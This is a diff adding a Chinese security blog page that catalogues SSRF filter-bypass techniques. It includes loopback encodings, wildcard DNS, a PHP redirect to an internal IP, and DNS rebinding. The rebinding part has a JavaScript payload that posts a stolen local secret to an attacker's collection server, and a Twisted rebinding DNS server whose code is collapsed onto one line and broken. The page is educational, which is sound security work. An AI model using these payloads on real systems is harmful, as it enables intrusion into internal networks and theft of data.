@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p0melo">
+    
+    <title>
+        
+            SSRF绕过姿势汇总 |
+        
+        p0melo
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/p0melo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/p0melo.svg","favicon":"/images/p0melo.svg","article_img_align":"left","left_side_width":"300px","content_max_width":"950px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/pexels-snapwire-32237.jpg","description":"Stay Hungry Stay Foolish."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+.progress-bar-container {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  z-index: $z-index-9;
+
+  if (hexo-config('pjax.enable') == true) {
+
+    .pjax-progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 2px;
+      width: 0;
+      background: var(--pjax-progress-bar-color);
+      visibility: hidden;
+      opacity: 0;
+      z-index: $z-index-8;
+      transition-t("width", "0", "0.1", "linear");
+
+
+      &.show {
+        opacity: 1;
+        visibility: visible;
+      }
+    }
+
+
+    .pjax-progress-icon {
+      position: absolute;
+      top: 0;
+      right: 0;
+      z-index: $z-index-8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 7px 6px 0 0;
+      visibility: hidden;
+      font-size: 1.1rem;
+      color: var(--default-text-color);
+
+      +keep-tablet() {
+        padding: 6px 5px 0 0;
+        font-size: 1rem;
+      }
+
+      &.show {
+        visibility: visible;
+      }
+    }
+
+  }
+
+  if (hexo-config('style.scroll.progress_bar.enable') == true) {
+
+    .scroll-progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 0;
+      height: $scroll-progress-bar-height;
+      visibility: hidden;
+      z-index: $z-index-7;
+      background: var(--primary-color);
+      transition-t("width", "0", "0.1", "linear");
+
+      &.hide {
+        display: none !important;
+      }
+    }
+
+  }
+}
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                p0melo
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">SSRF绕过姿势汇总</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/p0melo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p0melo</span>
+                        
+                            <span class="author-label">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-01-12 19:17:47
+    </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="1-符号绕过"><a href="#1-符号绕过" class="headerlink" title="1. @符号绕过"></a>1. @符号绕过</h2><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
+<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
+<h2 id="2-点分隔符替换"><a href="#2-点分隔符替换" class="headerlink" title="2. 点分隔符替换"></a>2. 点分隔符替换</h2><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-本地回环地址"><a href="#3-本地回环地址" class="headerlink" title="3. 本地回环地址"></a>3. 本地回环地址</h2><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1 </span><br><span class="line">http:&#x2F;&#x2F;localhost </span><br><span class="line">http:&#x2F;&#x2F;127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http:&#x2F;&#x2F;127.1 </span><br><span class="line">http:&#x2F;&#x2F;127.0.1 </span><br><span class="line">http:&#x2F;&#x2F;0:80</span><br></pre></td></tr></table></figure>
+
+<p>IPV6</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:7f00:1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:127.0.0.1] </span><br><span class="line">http:&#x2F;&#x2F;ip6-localhost</span><br><span class="line">http:&#x2F;&#x2F;0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-DNS解析"><a href="#4-DNS解析" class="headerlink" title="4. DNS解析"></a>4. DNS解析</h2><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure>
+
+<p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-IP的进制转换"><a href="#5-IP的进制转换" class="headerlink" title="5. IP的进制转换"></a>5. IP的进制转换</h2><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a class="link"   target="_blank" rel="noopener" href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
+<h2 id="6-封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#6-封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="6. 封闭式字母数字 (Enclosed Alphanumerics)字符"></a>6. 封闭式字母数字 (Enclosed Alphanumerics)字符</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
+<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-利用网址缩短"><a href="#7-利用网址缩短" class="headerlink" title="7. 利用网址缩短"></a>7. 利用网址缩短</h2><p>网上有很多将网址转换未短网址的网站。</p>
+<ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+<h2 id="8-利用30X重定向"><a href="#8-利用30X重定向" class="headerlink" title="8. 利用30X重定向"></a>8. 利用30X重定向</h2><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p>
+<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
+<p>服务端代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="9-DNS重绑定-DNS-Rebinding"><a href="#9-DNS重绑定-DNS-Rebinding" class="headerlink" title="9. DNS重绑定(DNS Rebinding)"></a>9. DNS重绑定(DNS Rebinding)</h2><p>通常我们通过域名访问应用的流程是：浏览器向DNS服务器发送请求，DNS服务器将请求的域名转换为ip地址，然后向对应的IP地址请求资源，最后回显给用户。</p>
+<p>在访问DNS后请求方会缓存域名和IP的对应关系，而缓存时间就是由DNS服务器设置的TTL值决定。</p>
+<p>当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，对于浏览器来说前后2次访问是同一域名，所以认为是安全的，这就可导致绕过同源策略和SSRF限制。下面介绍3种常见的DNS从绑定方法。</p>
+<h3 id="9-1-TTL-0的A记录"><a href="#9-1-TTL-0的A记录" class="headerlink" title="9.1 TTL=0的A记录"></a>9.1 TTL=0的A记录</h3><p>国内的域名厂商基本都不可以设置TTL为0，某些国外的域名才可以设置TTL=0，这方法只适用于前后两次请求存在一定有时间间隔或时间可控的情况。</p>
+<p>举个CTF例子，你能向服务器提交一个URL,并且服务器会访问你提交的url。然后flag藏在服务器的本身的<code>http://127.0.0.1/secret</code>上。只能本地访问。</p>
+<p>但是这里你提交你能控制的页面<code>www.x.com/index.php</code>，但是由于同源策略的原因你没办法去获取服务器上的<code>http://127.0.0.1/secret</code>。 但是通过<code>dns rebinding</code>就可以了。 比如你的页面如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">POST</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    alert();</span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">    url:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="javascript">    type:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">&quot;http://xss平台&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>整个过程如下：</p>
+<ol>
+<li>你提交的是<code>www.x.com/index.php</code>，内容如上述代码</li>
+<li>设置你的域名的TTL=0，提交之后服务器会请求dns的域名与ip的关系然后找到你的这个页面，然后开始执行js。</li>
+<li>执行的时候先延迟90s，利用这延迟的90s，去修改你域名的A记录绑定到127.0.0.1上</li>
+<li>然后js延迟结束之后之后又会请求<code>http://www.x.com/secret</code>，由于你之前设置的TTL=0，所以又会重新向dns服务器请求一次ip。得到ip=127.0.0.1，而整个过程访问的都是同一域名，所以浏览器认为是安全的。就会成功去访问<code>http://127.0.0.1/secret</code>，从而绕过同源策略</li>
+</ol>
+<h3 id="9-2-两条A记录"><a href="#9-2-两条A记录" class="headerlink" title="9.2 两条A记录"></a>9.2 两条A记录</h3><p>域名解析配置2条A记录，一条为外网的VPS IP，一条为内网IP，就<a class="link"   target="_blank" rel="noopener" href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>这题而言，服务器会向DNS服务器连续访问2次请求，第一次判断解析后的IP是否在黑名单IP(本地IP)中，第二次就直接访问域名，所以需要第一次解析为外网地址，第二次解析为127.0.0.1，这种情况就可以采用此方法。DNS服务器绑定2条记录的解析是随机的，所以成功率只有1/4。</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/586e317cb6a56d3762000002.png" class="" title="img">
+
+<h3 id="9-3-NS记录-自建DNS服务器"><a href="#9-3-NS记录-自建DNS服务器" class="headerlink" title="9.3 NS记录+自建DNS服务器"></a>9.3 NS记录+自建DNS服务器</h3><p>此方法需要再我们DNS解析配置一条NS记录和一条A记录</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161403319.png" class="" title="image-20220112161403319">
+
+<p>ns记录表示域名<code>test.p0melo.top</code>这个子域名指定由<code>ns.p0melo.top</code>这个域名服务器来解析，然后a记录表示我的这个<code>ns.p0melo.top</code>的位置在ip地址<code>149.248.18.38</code>上。然后我们用python的twisted库搭建一个DNS服务器就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord&#x3D;&#123;&#125;class DynamicResolver(object):    def _doDynamicResponse(self, query):        name &#x3D; query.name.name        if name not in record or record[name]&lt;1:            ip&#x3D;&quot;149.248.18.38&quot;        else:            ip&#x3D;&quot;127.0.0.1&quot;        if name not in record:            record[name]&#x3D;0        record[name]+&#x3D;1        print name+&quot; &#x3D;&#x3D;&#x3D;&gt; &quot;+ip        answer &#x3D; dns.RRHeader(            name&#x3D;name,            type&#x3D;dns.A,            cls&#x3D;dns.IN,            ttl&#x3D;0,            payload&#x3D;dns.Record_A(address&#x3D;b&#39;%s&#39;%ip,ttl&#x3D;0)        )        answers &#x3D; [answer]        authority &#x3D; []        additional &#x3D; []        return answers, authority, additional    def query(self, query, timeout&#x3D;None):        return defer.succeed(self._doDynamicResponse(query))def main():    factory &#x3D; server.DNSServerFactory(        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]    )    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)    reactor.listenUDP(53, protocol)    reactor.run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    raise SystemExit(main())</span><br></pre></td></tr></table></figure>
+
+<p>我们使用<code>nslookup test.p0melo.top</code>查看解析结果，可以看到前后两次DNS解析不同</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161740821.png" class="" title="image-20220112161740821">
+
+<p><strong>参考链接</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRF防御与绕过<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >关于DNS重绑定总结<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">《静态程序分析（南京大学）》课程笔记</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PHP的PCRE库回溯问题</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;Comments</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
+                    appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '欢迎吐槽~',
+                    lang: 'en'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'p0melo';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">p0melo</a>
+        </div>
+        
+		<!--
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+		-->
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-text">1. @符号绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%82%B9%E5%88%86%E9%9A%94%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="nav-text">2. 点分隔符替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%9C%AC%E5%9C%B0%E5%9B%9E%E7%8E%AF%E5%9C%B0%E5%9D%80"><span class="nav-text">3. 本地回环地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-DNS%E8%A7%A3%E6%9E%90"><span class="nav-text">4. DNS解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-IP%E7%9A%84%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">5. IP的进制转换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%B0%81%E9%97%AD%E5%BC%8F%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-Enclosed-Alphanumerics-%E5%AD%97%E7%AC%A6"><span class="nav-text">6. 封闭式字母数字 (Enclosed Alphanumerics)字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E5%88%A9%E7%94%A8%E7%BD%91%E5%9D%80%E7%BC%A9%E7%9F%AD"><span class="nav-text">7. 利用网址缩短</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E5%88%A9%E7%94%A830X%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">8. 利用30X重定向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-DNS%E9%87%8D%E7%BB%91%E5%AE%9A-DNS-Rebinding"><span class="nav-text">9. DNS重绑定(DNS Rebinding)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-TTL-0%E7%9A%84A%E8%AE%B0%E5%BD%95"><span class="nav-text">9.1 TTL&#x3D;0的A记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E4%B8%A4%E6%9D%A1A%E8%AE%B0%E5%BD%95"><span class="nav-text">9.2 两条A记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-NS%E8%AE%B0%E5%BD%95-%E8%87%AA%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">9.3 NS记录+自建DNS服务器</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
